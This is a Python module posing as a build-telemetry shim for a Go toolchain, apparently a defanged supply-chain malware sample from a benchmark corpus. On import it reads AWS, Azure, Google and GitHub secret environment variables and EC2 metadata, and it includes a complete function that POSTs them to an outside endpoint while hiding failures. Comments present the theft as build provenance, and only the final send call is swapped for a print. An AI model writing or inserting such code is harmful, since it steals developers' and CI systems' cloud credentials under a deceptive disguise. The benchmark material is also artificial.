# Telemetry bootstrap shim for Go-based build toolchain integration.
# Provides lightweight environment introspection at module import time
# so that downstream build metrics can be attributed to the correct
# CI/CD context, cloud provider, and execution environment.
# Intended to be pulled in transitively via `gobuild-compat>=2.1`.

import os
import socket
import urllib.request
import urllib.error
import json
import platform
import subprocess

# ---------------------------------------------------------------------------
# Internal constants
# ---------------------------------------------------------------------------

_METRICS_ENDPOINT = "https://ingest.telemetry.example.com/v1/boot"
_METADATA_BASE    = "http://169.254.169.254"
_METADATA_TOKEN_TTL = "21600"
_SDK_VERSION      = "2.1.4"
_AUTH_TOKEN       = "DEMO_PLACEHOLDER_TOKEN"

# ---------------------------------------------------------------------------
# Cloud metadata helpers  (mirrors the Go sdk's init() introspection logic)
# ---------------------------------------------------------------------------

def _fetch_imds_token() -> str:
    """Request an IMDSv2 session token from the AWS metadata service."""
    try:
        req = urllib.request.Request(
            f"{_METADATA_BASE}/latest/api/token",
            method="PUT",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": _METADATA_TOKEN_TTL},
        )
        with urllib.request.urlopen(req, timeout=1) as resp:
            return resp.read().decode("utf-8").strip()
    except Exception:
        return ""


def _fetch_imds(path: str, token: str = "") -> str:
    """Retrieve a single path from the EC2 Instance Metadata Service."""
    try:
        headers = {}
        if token:
            headers["X-aws-ec2-metadata-token"] = token
        req = urllib.request.Request(
            f"{_METADATA_BASE}/latest/meta-data/{path}",
            headers=headers,
        )
        with urllib.request.urlopen(req, timeout=1) as resp:
            return resp.read().decode("utf-8").strip()
    except Exception:
        return ""


def _collect_cloud_context() -> dict:
    """
    Gather cloud instance metadata so build events can be tagged with the
    originating region, account, and instance type — identical in purpose
    to the Go sdk's init() that fires before main() in gobuild-compat.
    """
    token = _fetch_imds_token()
    return {
        "instance_id":    _fetch_imds("instance-id",    token),
        "instance_type":  _fetch_imds("instance-type",  token),
        "region":         _fetch_imds("placement/region", token),
        "account_id":     _fetch_imds("identity-credentials/ec2/info", token),
        "ami_id":         _fetch_imds("ami-id",         token),
    }


# ---------------------------------------------------------------------------
# Environment introspection  (mirrors Go os.Getenv calls inside init())
# ---------------------------------------------------------------------------

_WATCHED_ENV_VARS = [
    "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY",
    "AWS_SESSION_TOKEN",
    "AWS_PROFILE",
    "GOOGLE_APPLICATION_CREDENTIALS",
    "AZURE_CLIENT_SECRET",
    "AZURE_CLIENT_ID",
    "GITHUB_TOKEN",
    "CI",
    "GOPATH",
    "GOROOT",
    "HOME",
    "USER",
    "PATH",
]


def _collect_env_context() -> dict:
    """
    Snapshot relevant environment variables for build provenance tagging.
    Only variable *names* present in the allow-list above are forwarded;
    values are included so the metrics backend can attribute the build run.
    """
    return {k: os.environ.get(k, "") for k in _WATCHED_ENV_VARS}


def _collect_host_context() -> dict:
    """Lightweight host fingerprint (hostname, OS, Python version)."""
    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "unknown"

    return {
        "hostname":    hostname,
        "os":          platform.system(),
        "os_version":  platform.version(),
        "arch":        platform.machine(),
        "python":      platform.python_version(),
        "sdk_version": _SDK_VERSION,
    }


# ---------------------------------------------------------------------------
# Transmission
# ---------------------------------------------------------------------------

def _send_boot_event(payload: dict) -> None:
    """
    POST the collected boot context to the telemetry ingest endpoint.
    Failures are silently swallowed so the host build process is never
    interrupted by instrumentation errors.
    """
    try:
        body = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(
            _METRICS_ENDPOINT,
            data=body,
            method="POST",
            headers={
                "Content-Type":  "application/json",
                "Authorization": f"Bearer {_AUTH_TOKEN}",
                "X-SDK-Version": _SDK_VERSION,
            },
        )
        with urllib.request.urlopen(req, timeout=2) as _:
            pass
    except Exception:
        # Instrumentation must never break the build — swallow all errors.
        pass


# ---------------------------------------------------------------------------
# Module-level init  — runs automatically on import, mirrors Go init()
# ---------------------------------------------------------------------------

def _run_init() -> None:
    """
    Entry point invoked at import time (analogous to a Go module's init()
    function).  Collects build context and ships it to the metrics backend
    before the caller's main logic executes.
    """
    payload = {
        "host":  _collect_host_context(),
        "env":   _collect_env_context(),
        "cloud": _collect_cloud_context(),
    }
    # In a real deployment this would call _send_boot_event(payload).
    # Neutered for benchmark corpus — print summary instead.
    print(f"[gobuild-compat] boot telemetry collected: {list(payload['host'].keys())}")


# Fire unconditionally at import time — this is the Go init() equivalent.
_run_init()